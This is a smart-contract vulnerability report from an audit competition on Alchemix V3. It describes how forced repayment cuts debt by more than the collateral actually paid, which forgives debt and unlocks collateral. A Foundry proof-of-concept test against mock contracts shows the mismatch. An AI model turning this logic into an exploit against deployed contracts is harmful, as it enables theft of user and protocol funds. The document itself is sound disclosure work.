# 57907 sc high incorrect forced repayment accounting allows debt forgiveness and frees locked collateral systemic loss&#x20;

**Submitted on Oct 29th 2025 at 12:25:05 UTC by @edoscoba for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57907
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Theft of unclaimed yield
  * Theft of unclaimed royalties

## Description

## Brief/Intro

The AlchemistV3 forced-repayment path reduces an account’s debt by a target “credit” amount in debt tokens before verifying that the account has enough MYT shares to repay the equivalent value. The actual MYT transferred is clamped to the account’s available collateral, causing the protocol to forgive debt without receiving the equivalent repayment. This also frees more locked collateral than warranted, degrading solvency and enabling systemic loss.

## Vulnerability Details

In the liquidation flow, when an account is below the lower bound, the contract first attempts a “forced repayment” of earmarked debt using the account’s own MYT collateral.

Core logic (abridged) in `src/AlchemistV3.sol:738`:

* Compute the intended debt reduction (“credit”) in debt-token units and the equivalent required MYT shares:
  * `credit = min(amount, debt)`
  * `creditToYield = convertDebtTokensToYield(credit)`
* Immediately reduce the account’s debt by the full `credit`:
  * `_subDebt(accountId, credit)` (src/AlchemistV3.sol:758)
  * Note: `_subDebt` also frees locked collateral proportional to `credit`.
* Only afterwards, clamp the actual MYT repayment to the account’s available collateral:
  * `creditToYield = min(creditToYield, account.collateralBalance)` (src/AlchemistV3.sol:764)
  * Transfer only this clamped `creditToYield` to the Transmuter (src/AlchemistV3.sol:777‒780).

Because the debt is reduced by the larger “credit” while only the smaller, clamped MYT amount is sent, the debited debt can exceed the debt-equivalent of the MYT paid. Denote:

* `creditDebt` = the target debt reduction (in debt tokens)
* `paidYield` = actual MYT shares sent after clamping
* `paidDebtEq` = `convertYieldTokensToDebt(paidYield)`

The bug is: `creditDebt > paidDebtEq`. This overstates repayment, frees too much locked collateral (via `_subDebt`), and reduces `totalDebt` without equivalent asset outflow.

This behavior contradicts the program’s stated design:

* Program-Overview: `The only way to withdraw earmarked collateral is to repay earmarked debt with external MYT tokens.` Forced repayment should never reduce debt (or free collateral) by more than the yield actually paid.

Why it’s exploitable and realistic:

* It requires only that an account has earmarked debt and insufficient MYT collateral to cover the equivalent yield at current share price.
* Lower MYT share prices (e.g., strategy drawdowns, withdrawal queues) make the mismatch larger because `convertDebtTokensToYield(credit)` grows while `account.collateralBalance` is fixed and thus clamped.

## Impact Details

* Debt is forgiven without equivalent MYT payment. The system’s `totalDebt` decreases (and per-account debt decreases), but the Transmuter receives less MYT than required to fulfill redemptions, causing a solvency gap.
* Locked collateral is freed based on the over-large `credit` (via `_subDebt`), enabling withdrawal of collateral that should remain locked, further weakening backing.
* Attack scenario: A borrower mints and later experiences MYT price decline; when liquidated, forced repayment removes more debt than the MYT actually paid, letting the borrower shed debt and unlock collateral at the protocol’s expense. Liquidators can repeatedly trigger this against undercollateralized, heavily earmarked accounts.

Magnitude:

* One-shot loss per forced repayment equals `creditDebt - convertYieldTokensToDebt(paidYield)`, plus the downstream effect of prematurely reducing `_totalLocked`.
* Over multiple liquidations in volatile conditions, this can materialize as material systemic loss and potential inability to satisfy Transmuter redemptions.

Severity: High. It enables a violation of conservation (debt removed without equivalent backing outflow) and unlocks collateral improperly, risking insolvency.

## References

* Vulnerable logic: `src/AlchemistV3.sol:738` (\_forceRepay), `_subDebt` at `src/AlchemistV3.sol:932`.
* Event emitted: `ForceRepay(uint256 accountId, uint256 amount, uint256 creditToYield, uint256 protocolFeeTotal)` (src/interfaces/IAlchemistV3.sol:580).
* Design intent: Program-Overview: “The only way to withdraw earmarked collateral is to repay earmarked debt with external MYT tokens.”

## Proof of Concept

## Proof of Concept

A test was added that demonstrates the mismatch. It:

1. Deposits MYT and mints to minimum collateralization.
2. Creates a Transmuter redemption equal to the account’s debt to fully earmark.
3. Drops MYT share price sharply so the MYT needed to repay earmarked debt exceeds the account’s available MYT.
4. Calls `liquidate()`, which triggers `_forceRepay`.
5. Captures the `ForceRepay` event and compares:
   * `evAmountDebt` (debt reduced) vs `convertYieldTokensToDebt(evCreditToYield)` (debt-equivalent of MYT actually sent).

Key excerpt from the test output:

* `ForceRepay(accountId: 1, amount: 9e19, creditToYield: 1e20, protocolFeeTotal: 0)`
* `convertYieldTokensToDebt(1e20) = 5e18`
* Shows `evAmountDebt (9e19) >> debtFromYieldPaid (5e18)`

This proves that debt is reduced by 90e18 while only 5e18 in debt-equivalent MYT was actually paid — i.e., debt forgiveness occurred. The test is included as `testDebtForgivenessOnForcedRepayment()` in `src/test/AlchemistV3.t.sol` and passes with:

* `forge test -m testDebtForgivenessOnForcedRepayment`

import this also : `import {Vm} from "../../lib/forge-std/src/Vm.sol";`.

```solidity
 /// Demonstrates the "Debt Forgiveness on Forced Repayment" issue.
    /// The account's debt is reduced by the full earmarked amount in debt tokens,
    /// while the MYT actually sent to the transmuter is clamped by available collateral (in shares),
    /// leading to debt reduction greater than the debt-equivalent of repaid yield.
    function testDebtForgivenessOnForcedRepayment() external {
        // Use a clean protocol fee for clarity
        vm.prank(alOwner);
        alchemist.setProtocolFee(0);
        vm.prank(alOwner);
        alchemist.setRepaymentFee(0);

        // 1) User deposits MYT shares and mints debt up to the minimum collateralization
        uint256 depositAmount = 100e18;
        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount);
        alchemist.deposit(depositAmount, address(0xbeef), 0);
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        uint256 mintAmount = alchemist.totalValue(tokenId) * FIXED_POINT_SCALAR / alchemist.minimumCollateralization();
        alchemist.mint(tokenId, mintAmount, address(0xbeef));
        vm.stopPrank();

        // 2) Create a transmuter redemption to generate earmarks equal to the account's entire debt
        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), mintAmount);
        transmuterLogic.createRedemption(mintAmount);
        vm.stopPrank();

        // Advance blocks to fully mature the redemption so earmarks are maximized
        vm.roll(block.number + 5_256_000);

        // 3) Drop the MYT share price significantly so convertDebtTokensToYield(amount) exceeds collateralBalance
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        // reset and then heavily increase supply to reduce share price
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        uint256 modifiedVaultSupply = initialVaultSupply * 20; // ~20x supply => ~1/20 share price
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        // 4) Liquidate, which first attempts a forced repayment from earmarked debt using account collateral
        vm.recordLogs();
        vm.startPrank(externalUser);
        // ensure account is liquidatable under lowered price; revert here would fail the test
        alchemist.liquidate(tokenId);
        vm.stopPrank();

        // 5) Parse ForceRepay event to compare repaid debt (amount) vs debt-equivalent of MYT actually sent
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 sig = keccak256("ForceRepay(uint256,uint256,uint256,uint256)");
        bool found;
        uint256 evAccountId;
        uint256 evAmountDebt; // in debt tokens
        uint256 evCreditToYield; // in MYT shares

        for (uint256 i = 0; i < entries.length; i++) {
            if (entries[i].topics.length > 0 && entries[i].topics[0] == sig) {
                found = true;
                evAccountId = uint256(entries[i].topics[1]);
                (evAmountDebt, evCreditToYield,) = abi.decode(entries[i].data, (uint256, uint256, uint256));
                break;
            }
        }

        assertTrue(found, "ForceRepay event not found");
        assertEq(evAccountId, tokenId, "ForceRepay account mismatch");

        // Convert the actual MYT paid back into debt units
        uint256 debtFromYieldPaid = alchemist.convertYieldTokensToDebt(evCreditToYield);

        // Vulnerability: debt reduced (evAmountDebt) can exceed the debt-equivalent of the yield actually repaid
        assertGt(evAmountDebt, debtFromYieldPaid, "Expected debt forgiveness: repaid debt > debt from yield paid");
        console.log("evAmountDebt",evAmountDebt);
        console.log("debtFromYieldPaid",debtFromYieldPaid);
    }
```
